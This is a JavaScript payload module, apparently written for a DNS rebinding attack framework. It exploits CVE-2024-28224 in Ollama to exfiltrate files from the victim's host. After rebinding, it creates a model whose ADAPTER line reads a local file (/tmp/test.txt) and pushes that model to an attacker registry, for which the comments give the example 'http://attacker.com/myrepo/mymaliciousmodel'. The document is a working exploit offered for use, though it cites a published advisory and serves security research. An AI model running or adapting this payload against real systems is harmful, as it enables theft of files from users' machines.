/**
This is a sample payload to exfiltrate files from hosts running Ollama to an attacker server

Set EXFILTRATION_URL to a valid server e.g., "http://attacker.com/myrepo/mymaliciousmodel"

See https://research.nccgroup.com/2024/04/08/technical-advisory-ollama-dns-rebinding-attack-cve-2024-28224/

**/

const OllamaLLama2ExfilData = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        if (headers !== null) {
            console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
        };
        if (cookie !== null) {
            console.log(`Origin: ${window.location} headers: ${cookie}`);
        };
        if (body !== null) {
            console.log(`Origin: ${window.location} body:\n${body}`);
        };

        let EXFILTRATION_URL = "";
        sooFetch('/api/create', {
           method: 'POST',
             mode: "no-cors",
           headers: {
                     'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                },
                body: `{ "name": "${EXFILTRATION_URL}", "modelfile": "FROM llama2\\nSYSTEM You are a malicious model file\\nADAPTER /tmp/test.txt"}`
            }).then(responseOKOrFail("Could not invoke /api/create"))
            .then(function (d) { //data
                console.log(d)
                return sooFetch('/api/push', {
                    method: 'POST',
                      mode: "no-cors",
                    headers: {
                              'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                         },
                         body: `{ "name": "${EXFILTRATION_URL}", "insecure": true}`
                     });
            }).then(responseOKOrFail("Could not invoke /api/push"))
            .then(function (d) { //data
                console.log(d);
            });
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        if (body.includes("Ollama is running") === true) {
            return true;
        } else {
            return false;
        }
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["Ollama Llama2 Exfil"] = OllamaLLama2ExfilData();
